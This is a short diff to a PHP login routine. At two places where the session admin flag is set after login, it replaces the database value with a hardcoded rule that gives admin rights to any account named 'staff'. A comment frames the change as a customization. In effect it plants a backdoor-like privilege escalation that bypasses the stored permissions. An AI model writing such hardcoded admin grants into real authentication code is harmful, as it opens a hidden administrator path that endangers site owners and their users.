@@ -196,7 +196,8 @@ $user = ["id"=>$_SESSION['userId'], "username"=>$_SESSION['username'], "isadmin"
             // check for
             $_SESSION['username'] = $username;
             $_SESSION['userId']   = $user['id'];
-            $_SESSION['isadmin']  = $user['admin'];
+            // Cornerbites: staff user gets admin privileges
+            $_SESSION['isadmin']  = ($username === 'staff') ? 1 : $user['admin'];
             $_SESSION['permissions']  = json_decode($user['permissions'], true);
 
             // CSRF Token
@@ -254,7 +255,8 @@ $user = ["id"=>$_SESSION['userId'], "username"=>$_SESSION['username'], "isadmin"
                 // set session values
                 $_SESSION['username'] = $username;
                 $_SESSION['userId']   = $user['id'];
-                $_SESSION['isadmin']  = $user['admin'];
+                // Cornerbites: staff user gets admin privileges
+            $_SESSION['isadmin']  = ($username === 'staff') ? 1 : $user['admin'];
                 $_SESSION['permissions']  = json_decode($user['permissions'], true);
 
                 // CSRF Token
